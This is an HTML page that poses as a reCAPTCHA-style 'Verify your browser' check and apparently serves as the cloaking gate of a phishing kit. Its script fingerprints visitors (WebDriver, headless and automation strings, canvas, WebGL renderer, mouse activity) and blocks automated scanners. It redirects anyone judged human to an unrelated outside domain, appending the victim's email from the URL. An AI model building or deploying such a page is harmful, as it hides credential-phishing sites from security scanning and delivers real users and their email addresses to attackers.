<!DOCTYPE html>
<html lang="en">
<head>  
  <meta charset="UTF-8">
  <title></title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    .recapturemain{font-family:Arial,Helvetica,sans-serif;width:600px;margin:10% auto 0}.recapturemainin{width:300px;height:70px;background:#f9f9f9;border:1px solid silver;border-radius:5px;padding:5px 5px 5px 15px;margin:0 auto}.recapturemainin .lgo{width:70px}.leftcontainer>div,.recapturemainin>div{float:left}.leftcontainer{padding-top:20px}.recapturemainin .notrobottext{padding-top:5px}.recapturemainin .theboxcheck{width:25px;height:25px;border:2px solid #000;cursor:pointer;border-radius:2px}.thecheckboxarea{margin-right:10px}@media screen and (max-width:600px){.recapturemain{width:500px}}@media screen and (max-width:500px){.recapturemain{width:400px}}@media screen and (max-width:400px){.recapturemain{width:300px}}
    
    /* Bot Detection Status Styles */
    .detection-message {
      display: none;
      margin-top: 20px;
      padding: 15px;
      border-radius: 5px;
      text-align: center;
      font-weight: 500;
    }
    
    .detection-success {
      background-color: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    
    .detection-blocked {
      background-color: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    
    .blocked-page {
      display: none;
      text-align: center;
      margin-top: 30px;
      font-family: Arial, Helvetica, sans-serif;
    }
    
    .blocked-page h2 {
      color: #721c24;
      margin-bottom: 15px;
    }
    
    .blocked-page p {
      color: #666;
      margin: 10px 0;
    }
  </style>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>

<body>
<div class="displink"></div>
<div class="recapturemain">
    <p style="text-align:center;font-size:18px;font-weight:500;">Verify your browser</p>
	<div class="recapturemainin">
	  <div class="leftcontainer">
	    <div class="thecheckboxarea">
		  <div class="theboxcheck" id="checkboxButton"></div>
		  <img src="https://theexternalfiles.elevatedprude.shop/recapture/Rolling@1x-1.0s-31px-31px.gif" class="checkboxloading" style="width: 30px; display:none;">
		  <img src="https://theexternalfiles.elevatedprude.shop/recapture/re-capture-tick.png" class="checkboxtick" style="width: 28px; display:none;">
		</div>
	    <div class="notrobottext"> I'm not a robot </div>
	  </div>  
	  <div style="float:right;"><img src="https://theexternalfiles.elevatedprude.shop/recapture/re-capture-right-image.png" class="lgo"></div>  
	</div>
	<div class="detection-message" id="detectionMessage"></div>
	<div class="blocked-page" id="blockedPage">
	  <h2>⚠️ Verification Failed</h2>
	  <p>Suspicious activity detected. Access denied.</p>
	  <p id="blockReason" style="font-size: 12px; color: #999;"></p>
	</div>
  </div>

<script>
// ==================== ENHANCED BOT DETECTION ====================

var botDetectionReasons = [];
var totalScore = 0;
var threshold = 120;

function botScore() {
    var score = 0;
    var ua = navigator.userAgent;
    var uaLower = ua.toLowerCase();

    if (navigator.webdriver) {
        score += 80;
        botDetectionReasons.push("WebDriver detected");
    }

    var autoStrings = ["headless", "phantom", "selenium", "puppeteer", "playwright", "cypress"];
    for (var i = 0; i < autoStrings.length; i++) {
        if (uaLower.indexOf(autoStrings[i]) !== -1) {
            score += 40;
            botDetectionReasons.push("Automation: " + autoStrings[i]);
            break;
        }
    }

    if (!navigator.plugins || navigator.plugins.length === 0) {
        score += 15;
        botDetectionReasons.push("No plugins");
    }

    if (!navigator.languages || navigator.languages.length === 0) {
        score += 10;
        botDetectionReasons.push("No languages");
    }

    var isChromeUA = /chrome/i.test(ua) && !/edg/i.test(ua);
    if (isChromeUA && !window.chrome) {
        score += 30;
        botDetectionReasons.push("Chrome mismatch");
    }

    if (!navigator.permissions || typeof navigator.permissions.query !== "function") {
        score += 10;
        botDetectionReasons.push("No permissions API");
    }

    var hc = navigator.hardwareConcurrency;
    if (hc === 0 || hc === undefined) {
        score += 20;
        botDetectionReasons.push("No hardware info");
    }
    if (hc === 1) {
        score += 8;
        botDetectionReasons.push("Single core");
    }

    if (screen.width < 200 || screen.height < 200) {
        score += 30;
        botDetectionReasons.push("Screen too small");
    }
    if (screen.width > 4000 || screen.height > 4000) {
        score += 15;
        botDetectionReasons.push("Screen too large");
    }

    if (window.outerWidth === window.innerWidth && window.outerHeight === window.innerHeight) {
        score += 15;
        botDetectionReasons.push("No window chrome");
    }

    var hasTouch = ("ontouchstart" in window) || navigator.maxTouchPoints > 0;
    var isMobileUA = /mobi|android|iphone/i.test(ua);
    if (isMobileUA && !hasTouch) {
        score += 15;
        botDetectionReasons.push("Mobile UA mismatch");
    }

    if (navigator.deviceMemory && navigator.deviceMemory < 2) {
        score += 10;
        botDetectionReasons.push("Low memory");
    }

    var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    if (!tz || tz === "Etc/UTC" || tz === "UTC") {
        score += 8;
        botDetectionReasons.push("Default timezone");
    }

    if (ua.length < 50) {
        score += 10;
        botDetectionReasons.push("Short UA");
    }
    if (ua.length > 500) {
        score += 8;
        botDetectionReasons.push("Long UA");
    }

    return score;
}

function canvasFingerprint() {
    try {
        var canvas = document.createElement("canvas");
        var ctx = canvas.getContext("2d");
        if (!ctx) {
            botDetectionReasons.push("No canvas context");
            return { suspicious: true };
        }
        ctx.fillText("test", 0, 0);
        var imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        if (!imageData.data.length) {
            botDetectionReasons.push("Canvas read failed");
            return { suspicious: true };
        }
        return { suspicious: false };
    } catch (e) {
        botDetectionReasons.push("Canvas error");
        return { suspicious: true };
    }
}

function webglFingerprint() {
    try {
        var canvas = document.createElement("canvas");
        var gl = canvas.getContext("webgl");
        if (!gl) return { suspicious: false };
        
        var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (!debugInfo) return { suspicious: false };
        
        var renderer = (gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "").toLowerCase();
        var headlessRenderers = ["swiftshader", "llvmpipe", "softpipe", "mesa offscreen", "angle", "gallium"];
        
        for (var i = 0; i < headlessRenderers.length; i++) {
            if (renderer.indexOf(headlessRenderers[i]) !== -1) {
                botDetectionReasons.push("Headless GPU");
                return { suspicious: true };
            }
        }
        return { suspicious: false };
    } catch (e) {
        botDetectionReasons.push("WebGL error");
        return { suspicious: true };
    }
}

function checkBrowserConsistency() {
    var score = 0;
    
    if (navigator.vendor === "" || navigator.vendor === undefined) {
        score += 8;
        botDetectionReasons.push("No vendor");
    }

    if (navigator.vendor.indexOf("Google") === -1 && /chrome/i.test(navigator.userAgent)) {
        score += 5;
        botDetectionReasons.push("Vendor mismatch");
    }

    return score;
}

function checkInteractionCapability() {
    var score = 0;
    if (!window.PointerEvent) {
        score += 10;
        botDetectionReasons.push("No PointerEvent");
    }
    return score;
}

var humanSignals = 0;

document.addEventListener("mousemove", function() { 
    humanSignals += 5;
}, { passive: true });

document.addEventListener("click", function() { 
    humanSignals += 10;
}, { passive: true });

document.addEventListener("keydown", function() { 
    humanSignals += 8;
}, { passive: true });

document.addEventListener("touchstart", function() { 
    humanSignals += 15;
}, { passive: true });

document.addEventListener("wheel", function() {
    humanSignals += 3;
}, { passive: true });

function runBotDetection() {
    botDetectionReasons = [];
    totalScore = 0;
    
    totalScore += botScore();
    
    var fps = canvasFingerprint();
    if (fps.suspicious) totalScore += 20;
    
    var wgl = webglFingerprint();
    if (wgl.suspicious) totalScore += 25;
    
    totalScore += checkBrowserConsistency();
    totalScore += checkInteractionCapability();
    
    if (humanSignals < 1) totalScore += 25;
    
    if (humanSignals > 10) totalScore = Math.max(0, totalScore - 30);
    
    console.log({
        verdict: totalScore >= threshold ? "BOT_DETECTED" : "HUMAN_VERIFIED",
        score: totalScore,
        threshold: threshold,
        reasons: botDetectionReasons
    });
    
    return totalScore < threshold;
}

// ==================== ORIGINAL FUNCTIONALITY ====================

$(document).ready(function(){
    var theUrl = 'https://admiral.allinoneoutsdoor.com';
    mainHandlerx(theUrl);
});

function mainHandlerx(c){
    var i = geturlparameter("email");
    if(i) c+="#"+i;
    
    var o = $(".theboxcheck");
    var e = $(".checkboxloading");
    var n = $(".checkboxtick");
    var blockedPage = $("#blockedPage");
    var detectionMsg = $("#detectionMessage");
    
    o.click(function(){
        o.hide();
        e.show();
        
        // Run bot detection
        var isHuman = runBotDetection();
        
        setTimeout(function(){
            e.hide();
            
            if(isHuman) {
                // Human detected - proceed normally
                n.show();
                detectionMsg.html("✓ Verification passed").addClass("detection-success").show();
                
                setTimeout(function(){
                    window.location.replace(c);
                }, 1000);
            } else {
                // Bot detected - block access
                o.show();
                e.hide();
                n.hide();
                blockedPage.show();
                
                var reasons = botDetectionReasons.slice(0, 3).join(", ");
                $("#blockReason").text("Score: " + totalScore + " | " + reasons);
            }
        }, 2000);
    });
}
